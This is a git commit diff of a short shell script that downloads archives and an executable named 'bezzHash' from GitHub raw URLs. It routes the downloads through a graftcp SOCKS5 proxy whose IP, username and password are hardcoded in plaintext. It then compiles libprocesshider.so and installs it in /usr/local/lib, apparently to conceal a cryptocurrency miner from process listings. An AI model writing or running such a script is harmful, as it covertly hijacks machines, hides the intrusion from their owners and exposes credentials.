407a0e73ac4fd052151c3d4ef23b2861ffee99bb
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-07-21 04:15:07 -0600

    Update 10.sh

--- 10.sh
+++ 10.sh
@@ -1,19 +1,16 @@
-#!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/Amarudinsyah/bezzhash/main/graphics.tar.gz
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 103.253.24.243:8080
-socks5_username = woiden_berkah69
-socks5_password = liyan65
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -23,24 +20,23 @@ sleep .2
 echo " "
 echo " "
 
-echo ""
+echo " "
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo ""
+echo " "
 
 echo " "
 echo " "
 
-sudo wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
-
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
